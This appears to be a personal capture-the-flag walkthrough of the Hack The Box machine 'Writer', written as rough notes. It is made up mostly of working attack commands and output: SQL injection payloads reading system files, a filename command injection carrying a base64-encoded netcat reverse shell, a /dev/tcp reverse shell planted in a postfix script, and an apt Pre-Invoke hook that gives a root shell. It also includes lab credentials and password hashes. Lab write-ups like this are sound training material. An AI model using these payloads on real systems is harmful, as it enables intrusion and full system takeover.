#### port scanning
```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Story Bank | Writer.HTB
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
#### for smb
`└─$ netexec smb 10.129.168.241 -u guest -p '' --shares`
```
SMB         10.129.168.241  445    WRITER           [*] Unix - Samba (name:WRITER) (domain:) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.129.168.241  445    WRITER           [+] \guest: (Guest)
SMB         10.129.168.241  445    WRITER           [*] Enumerated shares
SMB         10.129.168.241  445    WRITER           Share           Permissions     Remark
SMB         10.129.168.241  445    WRITER           -----           -----------     ------
SMB         10.129.168.241  445    WRITER           print$                          Printer Drivers
SMB         10.129.168.241  445    WRITER           writer2_project                 
SMB         10.129.168.241  445    WRITER           IPC$                            IPC Service (writer server (Samba, Ubuntu))
```

`─$ sqlmap -u 'http://writer.htb/administrative' --forms  -D writer  -T users --dump`
```
+----+------------------+----------+----------------------------------+----------+--------------+
| id | email            | status   | password                         | username | date_created |
+----+------------------+----------+----------------------------------+----------+--------------+
| 1  | admin@writer.htb | Active   | 118e48794631a9612484ca8b55f622d0 | admin    | NULL         |
+----+------------------+----------+----------------------------------+----------+--------------+
```
118e48794631a9612484ca8b55f622d0, cannot crack this hash.

#### port 80
after some emulate, there is a Sqli point.
```
POST /administrative HTTP/1.1
Host: writer.htb
Content-Length: 71
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://writer.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://writer.htb/administrative
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

uname=' union select 1,load_file("/etc/passwd"),3,4,5,6;--&password=qwe 
```
It works.
```
<h3 class="animation-slide-top">Welcome root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
postfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin
filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh
john:x:1001:1001:,,,:/home/john:/bin/bash
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
```
try some sensitive files
```
uname=' union select 1,load_file("/home/kyle/.ssh/id_rsa"),3,4,5,6;--&password=qwe
None

uname=' union select 1,load_file("/etc/nginx/sites-enabled/000-default.conf"),3,4,5,6;--&password=qwe

"animation-slide-top">Welcome # Virtual host configuration for writer.htb domain
&lt;VirtualHost *:80&gt;
        ServerName writer.htb
        ServerAdmin admin@writer.htb
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
        &lt;Directory /var/www/writer.htb&gt;
                Order allow,deny
                Allow from all
        &lt;/Directory&gt;
        Alias /static /var/www/writer.htb/writer/static
        &lt;Directory /var/www/writer.htb/writer/static/&gt;
                Order allow,deny
                Allow from all
        &lt;/Directory&gt;
        ErrorLog ${APACHE_LOG_DIR}/error.log
        LogLevel warn
        CustomLog ${APACHE_LOG_DIR}/access.log combined
&lt;/VirtualHost&gt;
```
let's view the python application code

`uname=' union select 1,load_file("/var/www/writer.htb/writer.wsgi"),3,4,5,6;--&password=qwe`
```
 #!/usr/bin/python
import sys
import logging
import random
import os

# Define logging
logging.basicConfig(stream=sys.stderr)
sys.path.insert(0,&#34;/var/www/writer.htb/&#34;)

# Import the __init__.py from the app folder
from writer import app as application
application.secret_key = os.environ.get(&#34;SECRET_KEY&#34;, &#34;&#34;)
                                        


uname=' union select 1,load_file("/var/www/writer.htb/writer/__init__.py"),3,4,5,6;--&password=qwe

="animation-slide-top">Welcome from flask import Flask, session, redirect, url_for, request, render_template
from mysql.connector import errorcode
import mysql.connector
import urllib.request
import os
import PIL
from PIL import Image, UnidentifiedImageError
import hashlib

app = Flask(__name__,static_url_path=&#39;&#39;,static_folder=&#39;static&#39;,template_folder=&#39;templates&#39;)

#Define connection for database
def connections():
    try:
        connector = mysql.connector.connect(user=&#39;admin&#39;, password=&#39;ToughPasswordToCrack&#39;, host=&#39;127.0.0.1&#39;, database=&#39;writer&#39;)
        return connector
    except mysql.connector.Error as err:
        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
            return (&#34;Something is wrong with your db user name or password!&#34;)
        elif err.errno == errorcode.ER_BAD_DB_ERROR:
            return (&#34;Database does not exist&#34;)
        else:
            return (&#34;Another exception, returning!&#34;)
    else:
        print (&#39;Connection to DB is ready!&#39;)

#Define homepage
@app.route(&#39;/&#39;)
def home_page():
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return (&#34;Database error&#34;)
    cursor = connector.cursor()
    sql_command = &#34;SELECT * FROM stories;&#34;
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template(&#39;blog/blog.html&#39;, results=results)

user=&#39;admin&#39;, password= ToughPasswordToCrack


if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
```

#### identify the command injection
local_filename, headers = urllib.request.urlretrieve(image_url), and os.system("mv {} {}.jpg".format(local_filename, local_filename)) might be vulnrable.

It located in /dashboard/stories/add, from web, we add strory and upload image from my local file.
the mv {} {}.jpg could be injected like x.jpg; [your commands];

so we use add story to upload a local image file. and then use the URL upload to put the malicious file into mv function. This is because, there is a front end filter of the URL upload, so we upload the file to target, then use burps to modify the request and upload the local file of the target machine.

Use ping command for POC.create a malicious file on kali.
`└─$ touch "a.jpg; echo cGluZyAtYyA0IDEwLjEwLjE2LjcK | base64 -d | bash;"  add a ping command as POC`
set a tcpdump listener first get get the ping.
`set tcpdump -i tun0 icmp`
It works for me, so replace the ping to revershell.
#### fott hold
trigger this using Burp s, remember to upload a internet image to catch burp proxy entry of the image url to trigger mv {} {}.jpg command.Then set repeater as below to trigger the payload.
`└─$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.16 8823 >/tmp/f" | base64 `
```
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC4xNiA4ODIzID4vdG1wL2YK
```
`└─$ touch 'a.jpg; echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC4xNiA4ODIzID4vdG1wL2YK | base64 -d | bash;'`
step 1, upload maclisou file from file system.
step 2, use buro s to upload that file via URL upload.
```
POST /dashboard/stories/add HTTP/1.1
Host: writer.htb
Content-Length: 853
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://writer.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryB1LXeWYk3BXydLj9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://writer.htb/dashboard/stories/add
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJ1c2VyIjoiMScgb3IgMT0xICMifQ.aiKJjg.igj9wuPa5dMaoAVBnUgvBSQ3qv4
Connection: keep-alive

------WebKitFormBoundaryB1LXeWYk3BXydLj9
Content-Disposition: form-data; name="author"

1
------WebKitFormBoundaryB1LXeWYk3BXydLj9
Content-Disposition: form-data; name="title"

22
------WebKitFormBoundaryB1LXeWYk3BXydLj9
Content-Disposition: form-data; name="tagline"

33
------WebKitFormBoundaryB1LXeWYk3BXydLj9
Content-Disposition: form-data; name="image"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryB1LXeWYk3BXydLj9
Content-Disposition: form-data; name="image_url"

file:///var/www/writer.htb/writer/static/img/a.jpg; echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC4xNiA4ODIzID4vdG1wL2YK | base64 -d | bash;

http://writer.htb/static/img/


cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC4xMC4xNi43IDg4MjMgPi90bXAvZgo=


------WebKitFormBoundarylIYSBT7YOng278Ef
Content-Disposition: form-data; name="image"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundarylIYSBT7YOng278Ef
Content-Disposition: form-data; name="image_url"

file:///var/www/writer.htb/writer/static/img/a.jpg; echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC4xMC4xNi43IDg4MjMgPi90bXAvZgo | base64 -d | bash;
```

`└─$ nc -nvlp 8823`
```
listening on [any] 8823 ...
connect to [10.10.16.7] from (UNKNOWN) [10.129.167.161] 48440
bash: cannot set terminal process group (1109): Inappropriate ioctl for device
bash: no job control in this shell
www-data@writer:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### lateral move
from linpeas,
```
@reboot cd /var/www/writer2_project && python3 manage.py runserver 127.0.0.1:8080
incrontab Not Found
-rw-r--r-- 1 root root    1042 Feb 13  2020 /etc/crontab
```
and a credential for DB
```
[client]
database = dev
user = djangouser
password = DjangoSuperPassword
```
check the web service first. we can use python3 to interact with DB using dbshell command,  I passed the auth,but cannot interact with it.
use the DB info from writups,

`www-data@writer:/var/www/writer2_project$ echo "select username, password from auth_user where is_staff;"| python3 manage.py dbshell > hash.txt`
```
<re is_staff;"| python3 manage.py dbshell > hash.txt
www-data@writer:/var/www/writer2_project$ ls
ls
django_hashes.txtecho
hash.txt
manage.py
requirements.txt
static
staticfiles
writer_web
writerv2
www-data@writer:/var/www/writer2_project$ cat hash.txt
cat hash.txt
username	password
kyle	pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=
```
crack hash, get a passwd
`echo "pbkdf2_sha256\$260000\$wJO3ztk0fOlcbssnS1wJPD\$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=" > hash`

`└─$ hashcat -m 10000 hash -a 0 ~/tools/rockyou.txt `
```
pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
```
#### SSH login as user 1
`kyle@writer:~$ id`
```
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
```
As we can see user is in 2 groups, let check them
`kyle@writer:~$ find / -gid 997 2>/dev/null`
```
/etc/postfix/disclaimer
/var/spool/filter
```
/var/spool/filter -s a folder, and empty.

`kyle@writer:/etc/postfix$ cat disclaimer_addresses `
```
root@writer.htb
kyle@writer.htb
```
After some research, postfix is a SMTP agent working with mail server, and discalimer is a application to add sth to mail. Since we have 'w' privi of discalimer, we can write payload in it. Since the disclaimer will be restore in a shir while, we have to set a script to change it back using hwile true; cp xxx xxx ; Done ; &
```
#!/bin/sh
# Localize these.
bash -i >& /dev/tcp 10.10.16.7/8822 0>&1
```
check the master.cf file, we noticed the disclaimer is ran by john, another user of host. so what we need is to trigger postfix in terms of send a valid email.
```
kyle@writer:~$ nc 127.0.0.1 25
220 writer.htb ESMTP Postfix (Ubuntu)
helo 127.0.0.1
250 writer.htb
mail from: <kyle@writer.htb>
250 2.1.0 Ok
mail to: <root@writer.htb>
503 5.5.1 Error: nested MAIL command
    
500 5.5.2 Error: bad syntax
mail to: <root@writer.htb>
503 5.5.1 Error: nested MAIL command
rcpt to: <root@writer.htb>
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
.
250 2.0.0 Ok: queued as CEC587ED
```
afet "." teh email sent, and we got teh shell of john
#### Privi ES
`└─$ nc -nvlp 8823       `
```
listening on [any] 8823 ...
connect to [10.10.16.7] from (UNKNOWN) [10.129.163.129] 57624
bash: cannot set terminal process group (4889): Inappropriate ioctl for device
bash: no job control in this shell
john@writer:/var/spool/postfix$ id
id
uid=1001(john) gid=1001(john) groups=1001(john)
```
add persistence login
```
john@writer:/home/john/.ssh$ ls -la
ls -la
total 20
drwx------ 2 john john 4096 Jul  9  2021 .
drwxr-xr-x 4 john john 4096 Aug  5  2021 ..
-rw-r--r-- 1 john john  565 Jul  9  2021 authorized_keys
-rw------- 1 john john 2602 Jul  9  2021 id_rsa
-rw-r--r-- 1 john john  565 Jul  9  2021 id_rsa.pub
john@writer:/home/john/.ssh$ cat id_rsa	

john@writer:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
```
Also in group 1003
`john@writer:~$ find / -gid 1003 2>/dev/null `
```
/etc/apt/apt.conf.d
```
`john@writer:~$ ls -la /etc/apt/`
```
total 36
drwxr-xr-x   7 root root       4096 Jul  9  2021 .
drwxr-xr-x 102 root root       4096 Jul 28  2021 ..
drwxrwxr-x   2 root management 4096 Jul 28  2021 apt.conf.d
```
as we have w privi to this apt foler, create a payload file under it, and wait for trigger - apt or apt-get, for this host, we use pspy64 to check the processes.

https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/

`echo 'apt::Update::Pre-Invoke {“rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.7 8824 >/tmp/f”};’ > pwn`
```
The next time a user (or an automated root cronjob) runs apt update or apt-get update,
└─$ nc -nvlp 8824
listening on [any] 8824 ...
connect to [10.10.16.7] from (UNKNOWN) [10.129.163.129] 58408
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

#### lesson learned
- careful with SQLi point, SQLM can help to identify.
- WSGI for python application, and works with apache2
- check group of user.
- apt folder for ES
